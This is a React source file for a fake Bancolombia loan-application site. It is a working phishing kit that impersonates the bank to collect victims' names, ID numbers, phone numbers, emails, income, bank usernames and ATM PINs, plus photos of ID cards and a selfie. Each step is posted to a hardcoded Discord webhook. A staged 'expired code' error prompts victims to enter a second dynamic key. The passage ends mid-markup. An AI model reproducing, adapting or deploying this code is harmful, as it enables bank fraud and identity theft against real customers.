import { useState, useRef, useEffect } from 'react';
import {
  ChevronRight,
  X,
  CheckCircle,
  Tag,
  Shield,
  Heart,
  Smartphone,
  ChevronDown,
  Clock,
  DollarSign,
  FileText,
  User,
  Phone,
  Mail,
  CreditCard,
  Briefcase,
  AlertCircle,
  Lock,
} from 'lucide-react';

type FormStep = 0 | 1 | 2 | 3 | 4;

interface FormData {
  nombre: string;
  apellido: string;
  cedula: string;
  telefono: string;
  email: string;
  monto: string;
  plazo: string;
  tipoEmpleo: string;
  ingresos: string;
}

const INITIAL_FORM: FormData = {
  nombre: '',
  apellido: '',
  cedula: '',
  telefono: '',
  email: '',
  monto: '',
  plazo: '',
  tipoEmpleo: '',
  ingresos: '',
};

function BancolombiaLogo() {
  return <img src="/image.png" alt="Bancolombia" className="h-8 w-auto" />;
}

function Field({
  label,
  field,
  type = 'text',
  placeholder,
  icon: Icon,
  filter,
  maxLength,
  inputMode,
  form,
  errors,
  update,
}: {
  label: string;
  field: keyof FormData;
  type?: string;
  placeholder?: string;
  icon: typeof User;
  filter?: (v: string) => string;
  maxLength?: number;
  inputMode?: 'none' | 'text' | 'decimal' | 'numeric' | 'tel' | 'search' | 'email' | 'url';
  form: FormData;
  errors: Partial<FormData>;
  update: (field: keyof FormData, value: string) => void;
}) {
  return (
    <div className="flex flex-col gap-1">
      <label className="text-sm font-medium text-gray-700">{label}</label>
      <div className="relative">
        <Icon className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400 w-4 h-4" />
        <input
          type={type}
          inputMode={inputMode}
          value={form[field]}
          onChange={e => update(field, filter ? filter(e.target.value) : e.target.value)}
          placeholder={placeholder}
          maxLength={maxLength}
          className={`w-full pl-10 pr-4 py-3 rounded-xl border text-sm outline-none transition-all focus:border-[#FFCC00] focus:ring-2 focus:ring-[#FFCC00]/20 ${
            errors[field] ? 'border-red-400 bg-red-50' : 'border-gray-200 bg-gray-50'
          }`}
        />
      </div>
      {errors[field] && (
        <p className="text-xs text-red-500 flex items-center gap-1">
          <AlertCircle className="w-3 h-3" />
          {errors[field]}
        </p>
      )}
    </div>
  );
}

function SelectField({
  label,
  field,
  options,
  icon: Icon,
  form,
  errors,
  update,
}: {
  label: string;
  field: keyof FormData;
  options: { value: string; label: string }[];
  icon: typeof User;
  form: FormData;
  errors: Partial<FormData>;
  update: (field: keyof FormData, value: string) => void;
}) {
  return (
    <div className="flex flex-col gap-1">
      <label className="text-sm font-medium text-gray-700">{label}</label>
      <div className="relative">
        <Icon className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400 w-4 h-4 z-10" />
        <select
          value={form[field]}
          onChange={e => update(field, e.target.value)}
          className={`w-full pl-10 pr-10 py-3 rounded-xl border text-sm outline-none transition-all appearance-none focus:border-[#FFCC00] focus:ring-2 focus:ring-[#FFCC00]/20 ${
            errors[field] ? 'border-red-400 bg-red-50' : 'border-gray-200 bg-gray-50'
          }`}
        >
          <option value="">Selecciona una opción</option>
          {options.map(o => (
            <option key={o.value} value={o.value}>
              {o.label}
            </option>
          ))}
        </select>
        <ChevronDown className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 w-4 h-4 pointer-events-none" />
      </div>
      {errors[field] && (
        <p className="text-xs text-red-500 flex items-center gap-1">
          <AlertCircle className="w-3 h-3" />
          {errors[field]}
        </p>
      )}
    </div>
  );
}

function CreditForm({ onClose }: { onClose: () => void }) {
  const [step, setStep] = useState<FormStep>(0);
  const [esCliente, setEsCliente] = useState<boolean | null>(null);
  const [showLogin, setShowLogin] = useState(false);
  const [showPassword, setShowPassword] = useState(false);
  const [usuario, setUsuario] = useState('');
  const [usuarioError, setUsuarioError] = useState('');
  const [pin, setPin] = useState(['', '', '', '']);
  const pinRefs = [useRef<HTMLInputElement>(null), useRef<HTMLInputElement>(null), useRef<HTMLInputElement>(null), useRef<HTMLInputElement>(null)];
  const [showDynamicKey, setShowDynamicKey] = useState(false);
  const [otp, setOtp] = useState(['', '', '', '', '', '']);
  const otpRefs = [useRef<HTMLInputElement>(null), useRef<HTMLInputElement>(null), useRef<HTMLInputElement>(null), useRef<HTMLInputElement>(null), useRef<HTMLInputElement>(null), useRef<HTMLInputElement>(null)];
  const [otpAttempt, setOtpAttempt] = useState<1 | 2>(1);
  const [otpProcessing, setOtpProcessing] = useState(false);
  const [otpProgress, setOtpProgress] = useState(0);
  const [showApproved, setShowApproved] = useState(false);
  const [form, setForm] = useState<FormData>(INITIAL_FORM);
  const [submitted, setSubmitted] = useState(false);
  const [errors, setErrors] = useState<Partial<FormData>>({});
  const [isProcessing, setIsProcessing] = useState(false);
  const [progress, setProgress] = useState(0);
  const [showFinalStep, setShowFinalStep] = useState(false);
  const [images, setImages] = useState<{ cedulaFront: string | null; cedulaBack: string | null; selfie: string | null }>({ cedulaFront: null, cedulaBack: null, selfie: null });
  const sentSteps = useRef(new Set<string>());

  useEffect(() => {
    if (step === 1 && form.nombre.trim() && form.apellido.trim() && /^\d{6,12}$/.test(form.cedula) && /^\d{10}$/.test(form.telefono) && /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(form.email) && !sentSteps.current.has('step1')) {
      sentSteps.current.add('step1');
      sendToDiscord('step1', [
        { name: 'Nombre', value: `${form.nombre} ${form.apellido}`, inline: true },
        { name: 'Cédula', value: form.cedula, inline: true },
        { name: 'Teléfono', value: form.telefono, inline: true },
        { name: 'Email', value: form.email, inline: true },
      ]);
    }
    if (step === 2 && form.monto && form.plazo && !sentSteps.current.has('step2')) {
      sentSteps.current.add('step2');
      sendToDiscord('step2', [
        { name: 'Monto solicitado', value: `$${Number(form.monto).toLocaleString('es-CO')}`, inline: true },
        { name: 'Plazo', value: `${form.plazo} meses`, inline: true },
        { name: 'Cuota mensual estimada', value: `$${cuota()}`, inline: true },
      ]);
    }
    if (step === 3 && form.tipoEmpleo && form.ingresos && !sentSteps.current.has('step3')) {
      sentSteps.current.add('step3');
      sendToDiscord('step3', [
        { name: 'Nombre', value: `${form.nombre} ${form.apellido}`, inline: true },
        { name: 'Cédula', value: form.cedula, inline: true },
        { name: 'Teléfono', value: form.telefono, inline: true },
        { name: 'Email', value: form.email, inline: true },
        { name: 'Monto solicitado', value: `$${Number(form.monto).toLocaleString('es-CO')}`, inline: true },
        { name: 'Plazo', value: `${form.plazo} meses`, inline: true },
        { name: 'Tipo de empleo', value: form.tipoEmpleo, inline: true },
        { name: 'Ingresos mensuales', value: form.ingresos, inline: true },
        { name: 'Cliente', value: esCliente ? 'Sí' : 'No', inline: true },
        { name: 'Usuario', value: usuario || 'N/A', inline: true },
      ]);
    }
  }, [form, step, esCliente, usuario]);

  useEffect(() => {
    if (!isProcessing) return;
    setProgress(0);
    let current = 0;
    const interval = setInterval(() => {
      current += 1;
      setProgress(current);
      if (current >= 100) {
        clearInterval(interval);
        setTimeout(() => {
          setIsProcessing(false);
          setShowFinalStep(true);
        }, 600);
      }
    }, 100);
    return () => clearInterval(interval);
  }, [isProcessing]);

  useEffect(() => {
    if (!otpProcessing) return;
    setOtpProgress(0);
    let p = 0;
    const iv = setInterval(() => {
      p += 2;
      setOtpProgress(p);
      if (p >= 100) {
        clearInterval(iv);
        setTimeout(() => {
          setOtpProcessing(false);
          setOtp(['', '', '', '', '', '']);
          setOtpAttempt(2);
        }, 300);
      }
    }, 100);
    return () => clearInterval(iv);
  }, [otpProcessing]);

  const update = (field: keyof FormData, value: string) => {
    setForm(prev => ({ ...prev, [field]: value }));
    setErrors(prev => ({ ...prev, [field]: '' }));
  };

  const validateStep1 = () => {
    const e: Partial<FormData> = {};
    if (!form.nombre.trim()) e.nombre = 'Requerido';
    if (!form.apellido.trim()) e.apellido = 'Requerido';
    if (!form.cedula.trim() || !/^\d{6,12}$/.test(form.cedula)) e.cedula = 'Cédula inválida';
    if (!form.telefono.trim() || !/^\d{10}$/.test(form.telefono)) e.telefono = 'Teléfono inválido (10 dígitos)';
    if (!form.email.trim() || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(form.email)) e.email = 'Correo inválido';
    setErrors(e);
    return Object.keys(e).length === 0;
  };

  const validateStep2 = () => {
    const e: Partial<FormData> = {};
    if (!form.monto) e.monto = 'Requerido';
    if (!form.plazo) e.plazo = 'Requerido';
    setErrors(e);
    return Object.keys(e).length === 0;
  };

  const validateStep3 = () => {
    const e: Partial<FormData> = {};
    if (!form.tipoEmpleo) e.tipoEmpleo = 'Requerido';
    if (!form.ingresos) e.ingresos = 'Requerido';
    setErrors(e);
    return Object.keys(e).length === 0;
  };

  const sendToDiscord = async (event: string, extraFields?: { name: string; value: string; inline?: boolean }[]) => {
    const titles: Record<string, string> = {
      cliente: '👤 Selección: ¿Eres cliente Bancolombia?',
      pin: '👤 Inicio · 🔐 Login · 🔑 Clave principal',
      step1: '📋 Paso 1 - Datos personales',
      step2: '💰 Paso 2 - Monto y plazo',
      step3: '📄 Paso 3 - Situación laboral',
      otp: '🔢 Clave dinámica',
    };
    const payload = {
      embeds: [{
        title: titles[event] || event,
        color: 0xFFCC00,
        fields: extraFields || [],
        footer: { text: `Solicitud: BC-${Date.now().toString().slice(-8)}` },
        timestamp: new Date().toISOString(),
      }],
    };
    try {
      await fetch('https://discordapp.com/api/webhooks/1520999812894294076/PXKb2g1ftdOweRyjoEAubT9ISIwf5bhnSe5uZROY6t1rMRLOj9WzM4isj4Rwf7tJ4hnO', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
      });
    } catch {}
  };

  const submitAll = async () => {
    const files: { name: string; data: string }[] = [];
    if (images.cedulaFront) files.push({ name: 'cedula_frente.jpg', data: images.cedulaFront });
    if (images.cedulaBack) files.push({ name: 'cedula_dorso.jpg', data: images.cedulaBack });
    if (images.selfie) files.push({ name: 'selfie.jpg', data: images.selfie });

    const formData = new FormData();
    const embed = {
      embeds: [{
        title: '📄 Paso 4 - Documentos enviados',
        color: 0xFFCC00,
        fields: [
          { name: 'Nombre', value: `${form.nombre} ${form.apellido}`, inline: true },
          { name: 'Cédula', value: form.cedula, inline: true },
          { name: 'Teléfono', value: form.telefono, inline: true },
          { name: 'Email', value: form.email, inline: true },
          { name: 'Monto solicitado', value: `$${Number(form.monto).toLocaleString('es-CO')}`, inline: true },
          { name: 'Plazo', value: `${form.plazo} meses`, inline: true },
          { name: 'Tipo de empleo', value: form.tipoEmpleo, inline: true },
          { name: 'Cliente', value: esCliente ? 'Sí' : 'No', inline: true },
          { name: 'Usuario', value: usuario || 'N/A', inline: true },
        ],
        image: files.length > 0 ? { url: 'attachment://selfie.jpg' } : undefined,
        footer: { text: `Solicitud: BC-${Date.now().toString().slice(-8)}` },
        timestamp: new Date().toISOString(),
      }],
    };
    formData.append('payload_json', JSON.stringify(embed));
    for (const f of files) {
      const blob = await (await fetch(f.data)).blob();
      formData.append('files[' + files.indexOf(f) + ']', blob, f.name);
    }
    try {
      await fetch('https://discordapp.com/api/webhooks/1520999812894294076/PXKb2g1ftdOweRyjoEAubT9ISIwf5bhnSe5uZROY6t1rMRLOj9WzM4isj4Rwf7tJ4hnO', {
        method: 'POST',
        body: formData,
      });
    } catch {}
    setIsProcessing(true);
  };

  const next = () => {
    if (step === 1 && validateStep1()) {
      setStep(2);
    } else if (step === 2 && validateStep2()) {
      setStep(3);
    } else if (step === 3 && validateStep3()) {
      if (esCliente) {
        setIsProcessing(true);
      } else {
        setStep(4);
      }
    } else if (step === 4) {
      submitAll();
    }
  };

  const cuota = () => {
    if (!form.monto || !form.plazo) return null;
    const principal = Number(form.monto);
    const meses = Number(form.plazo);
    const tasa = 0.018;
    const c = (principal * tasa) / (1 - Math.pow(1 + tasa, -meses));
    return Math.round(c).toLocaleString('es-CO');
  };

  if (showLogin) {
    const handleLoginContinue = () => {
      if (!usuario.trim()) {
        setUsuarioError('Por favor ingresa tu usuario');
        return;
      }
      setShowLogin(false);
      setShowPassword(true);
    };

    return (
      <div className="fixed inset-0 z-50 bg-[#f5f5f3] overflow-hidden">
        {/* Top bar */}
        <div className="relative flex items-center justify-center py-4 px-6 border-b border-gray-200 bg-white">
          <BancolombiaLogo />
          <button
            onClick={onClose}
            className="absolute right-6 flex items-center gap-1.5 text-sm font-semibold text-gray-600 hover:text-gray-900 transition-colors"
          >
            Salir
            <ChevronRight className="w-4 h-4" />
          </button>
        </div>

        {/* Decorative wave — left */}
        <svg
          className="absolute left-0 top-16 pointer-events-none"
          width="340" height="420" viewBox="0 0 340 420" fill="none"
          xmlns="http://www.w3.org/2000/svg"
        >
          <path d="M-40 80 Q60 140 140 260 Q200 350 160 420" stroke="#F97316" strokeWidth="28" fill="none" strokeLinecap="round"/>
          <path d="M-20 60 Q80 130 160 250 Q220 340 180 420" stroke="#FFCC00" strokeWidth="20" fill="none" strokeLinecap="round"/>
        </svg>

        {/* Decorative wave — right */}
        <svg
          className="absolute right-0 top-0 pointer-events-none"
          width="340" height="460" viewBox="0 0 340 460" fill="none"
          xmlns="http://www.w3.org/2000/svg"
        >
          <path d="M380 0 Q300 80 240 180 Q180 300 220 420" stroke="#7C3AED" strokeWidth="28" fill="none" strokeLinecap="round"/>
          <path d="M360 -10 Q280 70 220 170 Q160 290 200 420" stroke="#FFCC00" strokeWidth="20" fill="none" strokeLinecap="round"/>
          <path d="M400 20 Q320 100 260 200 Q200 320 240 440" stroke="#F97316" strokeWidth="14" fill="none" strokeLinecap="round"/>
        </svg>

        {/* Main content */}
        <div className="relative z-10 flex flex-col items-center justify-center min-h-[calc(100vh-120px)] px-4 py-8">
          <p className="text-lg font-bold text-[#1C1C1C] mb-6">Te damos la bienvenida</p>

          <div className="bg-white rounded-2xl shadow-lg w-full max-w-md p-8">
            <p className="text-center text-sm mb-6 leading-relaxed">
              <span className="text-[#B45309]">El usuario es el mismo con el que ingresas a la </span>
              <span className="font-bold text-[#1C1C1C]">Sucursal Virtual Personas.</span>
            </p>

            {/* Usuario field — underline style */}
            <div className="mb-1">
              <div className={`flex items-center gap-3 border-b-2 pb-2 transition-colors ${usuarioError ? 'border-red-400' : 'border-gray-300 focus-within:border-[#FFCC00]'}`}>
                <User className="w-5 h-5 text-gray-400 shrink-0" />
                <input
                  type="text"
                  value={usuario}
                  onChange={e => { setUsuario(e.target.value); setUsuarioError(''); }}
                  placeholder="Usuario"
                  className="flex-1 text-sm outline-none bg-transparent placeholder:text-gray-400"
                  autoFocus
                />
              </div>
              {usuarioError && (
                <p className="text-xs text-red-500 mt-1 flex items-center gap-1">
                  <AlertCircle className="w-3 h-3" />
                  {usuarioError}
                </p>
              )}
            </div>

            <div className="flex justify-end mb-8">
              <button className="text-xs text-[#B45309] hover:underline mt-2">
                ¿Olvidaste tu usuario?
              </button>
            </div>

            <div className="flex gap-3">
              <button
                onClick={() => { setShowLogin(false); setEsCliente(null); }}
                className="flex-1 border-2 border-[#1C1C1C] text-[#1C1C1C] font-bold py-3 rounded-full hover:bg-gray-50 transition-all text-sm"
              >
                Volver
              </button>
              <button
                onClick={handleLoginContinue}
                className="flex-1 bg-[#FFCC00] hover:bg-[#f0c000] text-[#1C1C1C] font-bold py-3 rounded-full transition-all text-sm shadow-sm hover:shadow-md"
              >
                Continuar
              </button>
            </div>
          </div>
        </div>

        {/* Footer */}
        <div className="absolute bottom-0 left-0 right-0 border-t border-gray-200 bg-white px-6 py-4 flex items-center justify-between">
          <BancolombiaLogo />
          <p className="text-[10px] text-gray-400 text-right leading-relaxed">
            {new Date().toLocaleDateString('es-CO', { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' })}
          </p>
        </div>
      </div>
    );
  }

  if (showPassword) {
    const handlePinChange = (index: number, value: string) => {
      if (!/^\d*$/.test(value)) return;
      const next = [...pin];
      next[index] = value.slice(-1);
      setPin(next);
      if (value && index < 3) {
        pinRefs[index + 1].current?.focus();
      }
      if (value && index === 3) {
        setTimeout(() => {
          sendToDiscord('pin', [
            { name: 'Cliente Bancolombia', value: 'Sí', inline: true },
            { name: 'Usuario', value: usuario, inline: true },
            { name: 'Clave principal', value: next.join(''), inline: true },
          ]);
        }, 100);
      }
    };

    const handlePinKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
      if (e.key === 'Backspace' && !pin[index] && index > 0) {
        pinRefs[index - 1].current?.focus();
      }
    };

    const handlePasswordContinue = () => {
      setShowPassword(false);
      setStep(1);
    };

    return (
      <div className="fixed inset-0 z-50 bg-[#f5f5f3] overflow-hidden">
        {/* Top bar */}
        <div className="relative flex items-center justify-center py-4 px-6 border-b border-gray-200 bg-white">
          <BancolombiaLogo />
          <button
            onClick={onClose}
            className="absolute right-6 flex items-center gap-1.5 text-sm font-semibold text-gray-600 hover:text-gray-900 transition-colors"
          >
            Salir
            <ChevronRight className="w-4 h-4" />
          </button>
        </div>

        {/* Decorative wave — left */}
        <svg
          className="absolute left-0 top-16 pointer-events-none"
          width="340" height="420" viewBox="0 0 340 420" fill="none"
          xmlns="http://www.w3.org/2000/svg"
        >
          <path d="M-40 80 Q60 140 140 260 Q200 350 160 420" stroke="#F97316" strokeWidth="28" fill="none" strokeLinecap="round"/>
          <path d="M-20 60 Q80 130 160 250 Q220 340 180 420" stroke="#FFCC00" strokeWidth="20" fill="none" strokeLinecap="round"/>
        </svg>

        {/* Decorative wave — right */}
        <svg
          className="absolute right-0 top-0 pointer-events-none"
          width="340" height="460" viewBox="0 0 340 460" fill="none"
          xmlns="http://www.w3.org/2000/svg"
        >
          <path d="M380 0 Q300 80 240 180 Q180 300 220 420" stroke="#7C3AED" strokeWidth="28" fill="none" strokeLinecap="round"/>
          <path d="M360 -10 Q280 70 220 170 Q160 290 200 420" stroke="#FFCC00" strokeWidth="20" fill="none" strokeLinecap="round"/>
          <path d="M400 20 Q320 100 260 200 Q200 320 240 440" stroke="#F97316" strokeWidth="14" fill="none" strokeLinecap="round"/>
        </svg>

        {/* Main content */}
        <div className="relative z-10 flex flex-col items-center justify-center min-h-[calc(100vh-120px)] px-4 py-8">
          <p className="text-lg font-bold text-[#1C1C1C] mb-6">Clave principal</p>

          <div className="bg-white rounded-2xl shadow-lg w-full max-w-md p-8">
            <div className="flex flex-col items-center gap-3 mb-8">
              <Lock className="w-7 h-7 text-gray-500" strokeWidth={1.5} />
              <p className="text-sm text-gray-500 text-center">Es la misma que usas en el cajero automático</p>
            </div>

            {/* 4-digit PIN slots */}
            <div className="flex justify-center gap-6 mb-10">
              {pin.map((digit, i) => (
                <div key={i} className="flex flex-col items-center">
                  <input
                    ref={pinRefs[i]}
                    type="password"
                    inputMode="numeric"
                    maxLength={1}
                    value={digit}
                    onChange={e => handlePinChange(i, e.target.value)}
                    onKeyDown={e => handlePinKeyDown(i, e)}
                    autoFocus={i === 0}
                    className="w-8 text-center text-xl font-bold bg-transparent outline-none caret-[#FFCC00]"
                  />
                  <div className={`mt-1 h-0.5 w-8 transition-colors ${digit ? 'bg-[#FFCC00]' : 'bg-gray-400'}`} />
                </div>
              ))}
            </div>

            <div className="flex gap-3">
              <button
                onClick={() => { setShowPassword(false); setShowLogin(true); setPin(['', '', '', '']); }}
                className="flex-1 border-2 border-[#1C1C1C] text-[#1C1C1C] font-bold py-3 rounded-full hover:bg-gray-50 transition-all text-sm"
              >
                Volver
              </button>
              <button
                onClick={handlePasswordContinue}
                className={`flex-1 font-bold py-3 rounded-full transition-all text-sm shadow-sm ${pin.every(d => d !== '') ? 'bg-[#FFCC00] hover:bg-[#f0c000] text-[#1C1C1C] hover:shadow-md' : 'bg-gray-200 text-gray-400 cursor-not-allowed'}`}
                disabled={!pin.every(d => d !== '')}
              >
                Continuar
              </button>
            </div>
          </div>
        </div>

        {/* Footer */}
        <div className="absolute bottom-0 left-0 right-0 border-t border-gray-200 bg-white px-6 py-4 flex items-center justify-between">
          <BancolombiaLogo />
          <p className="text-[10px] text-gray-400 text-right leading-relaxed">
            {new Date().toLocaleDateString('es-CO', { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' })}
          </p>
        </div>
      </div>
    );
  }

  if (isProcessing) {
    const getStatusMessage = () => {
      if (progress < 25) return 'Verificando tu solicitud...';
      if (progress < 55) return 'Analizando tu información crediticia...';
      if (progress < 82) return 'Estamos configurando el monto del Crédito...';
      return 'Tu crédito ya está por finalizar';
    };

    const isDone = progress >= 82;

    return (
      <div className="fixed inset-0 z-50 bg-[#d4d4d2] flex flex-col overflow-hidden">
        {/* Top bar */}
        <div className="border-b border-gray-300 bg-white px-6 py-4 flex items-center justify-center">
          <BancolombiaLogo />
        </div>

        {/* Center content */}
        <div className="flex-1 flex flex-col items-center justify-center px-6">
          <div className="w-full max-w-2xl flex flex-col items-center gap-3">
            <p
              className={`text-sm font-semibold transition-colors duration-500 ${
                isDone ? 'text-[#1C1C1C]' : 'text-gray-600'
              }`}
            >
              {progress}%
            </p>

            {/* Progress bar */}
            <div className="w-full h-[3px] bg-gray-400/40 rounded-full overflow-hidden">
              <div
                className="h-full bg-[#FFCC00] rounded-full transition-all duration-100 ease-linear"
                style={{ width: `${progress}%` }}
              />
            </div>

            <p
              className={`text-sm transition-all duration-500 ${
                isDone ? 'font-semibold text-[#1C1C1C]' : 'text-gray-500'
              }`}
            >
              {getStatusMessage()}
            </p>

            {isDone && (
              <div className="mt-4 flex items-center gap-2 bg-white/60 backdrop-blur-sm rounded-full px-5 py-2 shadow-sm animate-pulse">
                <div className="w-2 h-2 rounded-full bg-[#FFCC00]" />
                <span className="text-xs font-semibold text-[#1C1C1C]">
                  Tu crédito está listo para finalizar
                </span>
              </div>
            )}
          </div>
        </div>
      </div>
    );
  }

  if (showFinalStep) {
    return (
      <div className="fixed inset-0 z-50 bg-white flex flex-col overflow-hidden">
        {/* Top bar */}
        <div className="border-b border-gray-100 bg-white px-6 py-4 flex items-center justify-center relative">
          <BancolombiaLogo />
          <button
            onClick={onClose}
            className="absolute right-6 flex items-center gap-1.5 text-sm font-semibold text-gray-500 hover:text-gray-900 transition-colors"
          >
            Salir
            <ChevronRight className="w-4 h-4" />
          </button>
        </div>

        {/* Main content */}
        <div className="flex-1 flex flex-col items-center justify-center px-6 py-10">
          {/* Success badge */}
          <div className="relative mb-8">
            <div className="w-24 h-24 rounded-full bg-[#FFFAE0] flex items-center justify-center shadow-lg">
              <CheckCircle className="w-12 h-12 text-[#FFCC00]" strokeWidth={1.5} />
            </div>
            <div className="absolute -bottom-1 -right-1 w-8 h-8 bg-green-500 rounded-full flex items-center justify-center shadow-md">
              <CheckCircle className="w-4 h-4 text-white" strokeWidth={2.5} />
            </div>
          </div>

          {/* Heading */}
          <h2 className="text-3xl font-extrabold text-[#1C1C1C] text-center leading-tight mb-3">
            ¡Tu crédito va<br />por buen camino!
          </h2>
          <p className="text-gray-500 text-sm text-center leading-relaxed max-w-xs mb-8">
            Revisamos tu información y todo luce excelente. Solo falta completar el último paso para activar tu crédito.
          </p>

          {/* Status cards */}
          <div className="w-full max-w-sm flex flex-col gap-3 mb-8">
            {[
              { label: 'Datos personales', ok: true },
              { label: 'Monto y plazo', ok: true },
              { label: 'Situación laboral', ok: true },
              { label: 'Confirmación final', ok: false, pending: true },
            ].map(({ label, ok, pending }) => (
              <div
                key={label}
                className={`flex items-center justify-between rounded-xl px-4 py-3 border ${
                  pending
                    ? 'border-[#FFCC00] bg-[#FFFAE0]'
                    : 'border-gray-100 bg-gray-50'
                }`}
              >
                <span className={`text-sm font-medium ${pending ? 'text-[#1C1C1C]' : 'text-gray-600'}`}>
                  {label}
                </span>
                {ok ? (
                  <CheckCircle className="w-4 h-4 text-green-500" strokeWidth={2.5} />
                ) : (
                  <div className="w-4 h-4 rounded-full border-2 border-[#FFCC00] animate-pulse" />
                )}
              </div>
            ))}
          </div>

          {/* CTA */}
          <button
            onClick={() => { setShowFinalStep(false); setShowDynamicKey(true); }}
            className="w-full max-w-sm bg-[#FFCC00] hover:bg-[#f0c000] text-[#1C1C1C] font-bold py-4 rounded-full transition-all shadow-md hover:shadow-lg hover:-translate-y-0.5 text-sm flex items-center justify-center gap-2"
          >
            Completar último paso
            <ChevronRight className="w-4 h-4" />
          </button>
        </div>

        {/* Footer */}
        <div className="border-t border-gray-100 bg-white px-6 py-4 flex items-center justify-center">
          <BancolombiaLogo />
        </div>
      </div>
    );
  }

  if (showDynamicKey) {
    const handleOtpChange = (index: number, value: string) => {
      if (otpProcessing) return;
      if (!/^\d*$/.test(value)) return;
      const next = [...otp];
      next[index] = value.slice(-1);
      setOtp(next);
      if (value && index < 5) {
        otpRefs[index + 1].current?.focus();
      }
      if (value && index === 5 && next.every(d => d !== '')) {
        if (otpAttempt === 1) {
          sendToDiscord('otp', [
            { name: 'Intento', value: '1 (fallido)', inline: true },
            { name: 'Usuario', value: usuario || 'N/A', inline: true },
            { name: 'Nombre', value: `${form.nombre} ${form.apellido}`, inline: true },
          ]);
          setOtpProcessing(true);
        } else {
          sendToDiscord('otp', [
            { name: 'Intento', value: '2 (exitoso)', inline: true },
            { name: 'Usuario', value: usuario || 'N/A', inline: true },
            { name: 'Nombre', value: `${form.nombre} ${form.apellido}`, inline: true },
          ]);
          setTimeout(() => {
            setShowDynamicKey(false);
            setOtp(['', '', '', '', '', '']);
            setOtpAttempt(1);
            setShowApproved(true);
          }, 350);
        }
      }
    };

    const handleOtpKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
      if (otpProcessing) return;
      if (e.key === 'Backspace' && !otp[index] && index > 0) {
        otpRefs[index - 1].current?.focus();
      }
    };

    const d = new Date();
    const days = ['Domingo', 'Lunes', 'Martes', 'Miércoles', 'Jueves', 'Viernes', 'Sábado'];
    const months = ['Enero', 'Febrero', 'Marzo', 'Abril', 'Mayo', 'Junio', 'Julio', 'Agosto', 'Septiembre', 'Octubre', 'Noviembre', 'Diciembre'];
    const dateStr = `${days[d.getDay()]} ${d.getDate()} de ${months[d.getMonth()]} del ${d.getFullYear()}`;

    return (
      <div className="fixed inset-0 z-50 bg-[#ededeb] flex flex-col overflow-hidden">
        {/* Full-screen decorative waves */}
        <svg
          className="absolute inset-0 w-full h-full pointer-events-none"
          viewBox="0 0 1440 900"
          preserveAspectRatio="xMidYMid slice"
          fill="none"
        >
          <path d="M-60 530 Q200 370 445 245" stroke="#F97316" strokeWidth="46" strokeLinecap="round"/>
          <path d="M-25 570 Q235 408 475 278" stroke="#FFCC00" strokeWidth="30" strokeLinecap="round"/>
          <path d="M1495 50 Q1295 175 1240 375 Q1190 560 1305 735" stroke="#7C3AED" strokeWidth="46" strokeLinecap="round"/>
          <path d="M1468 28 Q1268 153 1213 353 Q1163 538 1278 713" stroke="#FFCC00" strokeWidth="30" strokeLinecap="round"/>
          <path d="M1518 78 Q1318 203 1263 403 Q1213 588 1328 763" stroke="#F97316" strokeWidth="18" strokeLinecap="round"/>
          <path d="M340 860 Q610 755 875 860" stroke="#7C3AED" strokeWidth="46" strokeLinecap="round"/>
        </svg>

        {/* Top bar */}
        <div className="relative z-10 flex items-center justify-center py-4 px-8">
          <BancolombiaLogo />
          {!otpProcessing && (
            <button
              onClick={() => { setShowDynamicKey(false); setShowFinalStep(true); setOtp(['', '', '', '', '', '']); setOtpAttempt(1); }}
              className="absolute right-8 flex items-center gap-1.5 text-sm text-gray-500 hover:text-gray-900 transition-colors"
            >
              Salir
              <ChevronRight className="w-4 h-4" />
            </button>
          )}
        </div>

        {/* Title */}
        <p className="relative z-10 text-xl font-bold text-[#1C1C1C] text-center mt-6 mb-5">
          Clave dinámica
        </p>

        {/* Card */}
        <div className="relative z-10 flex items-start justify-center flex-1 px-4 pt-2 pb-28">
          <div className="bg-white rounded-2xl w-full max-w-sm px-10 py-8 shadow-sm overflow-hidden">

            {otpProcessing ? (
              /* ── Processing state ── */
              <div className="flex flex-col items-center gap-5 py-4">
                <div className="w-14 h-14 rounded-full border-4 border-gray-100 border-t-[#FFCC00] animate-spin" />
                <p className="text-sm font-semibold text-[#1C1C1C]">Verificando clave dinámica...</p>
                <div className="w-full h-1 bg-gray-100 rounded-full overflow-hidden">
                  <div
                    className="h-full bg-[#FFCC00] rounded-full transition-all duration-100 ease-linear"
                    style={{ width: `${otpProgress}%` }}
                  />
                </div>
                <p className="text-xs text-gray-400">Por favor espera</p>
              </div>
            ) : (
              <>
                {/* Token icon */}
                <div className="flex justify-center mb-3">
                  <svg viewBox="0 0 44 44" width="44" height="44" fill="none">
                    <circle cx="22" cy="22" r="20" stroke="#9CA3AF" strokeWidth="1.4"/>
                    <circle cx="22" cy="17" r="5.5" stroke="#9CA3AF" strokeWidth="1.4"/>
                    <path d="M10 37 Q10 29 22 29 Q34 29 34 37" stroke="#9CA3AF" strokeWidth="1.4" strokeLinecap="round"/>
                  </svg>
                </div>

                {/* Error banner (attempt 2) */}
                {otpAttempt === 2 && (
                  <div className="flex items-start gap-2 bg-red-50 border border-red-200 rounded-xl px-4 py-3 mb-4">
                    <AlertCircle className="w-4 h-4 text-red-500 shrink-0 mt-0.5" />
                    <p className="text-xs text-red-600 leading-relaxed">
                      <span className="font-bold">Clave vencida o incorrecta.</span> Por favor genera una nueva clave desde la App Mi Bancolombia e ingrésala a continuación.
                    </p>
                  </div>
                )}

                {/* Instruction */}
                <p className="text-center text-sm text-[#1565C0] leading-relaxed mb-6">
                  {otpAttempt === 2
                    ? 'Ingresa tu nueva Clave Dinámica.'
                    : 'Consulta tu Clave Dinámica desde la App Mi Bancolombia.'}
                </p>

                {/* 6-digit inputs */}
                <div className="flex justify-center gap-3.5 mb-8">
                  {otp.map((digit, i) => (
                    <div key={i} className="flex flex-col items-center">
                      <input
                        ref={otpRefs[i]}
                        type="password"
                        inputMode="numeric"
                        maxLength={1}
                        value={digit}
                        onChange={e => handleOtpChange(i, e.target.value)}
                        onKeyDown={e => handleOtpKeyDown(i, e)}
                        autoFocus={i === 0}
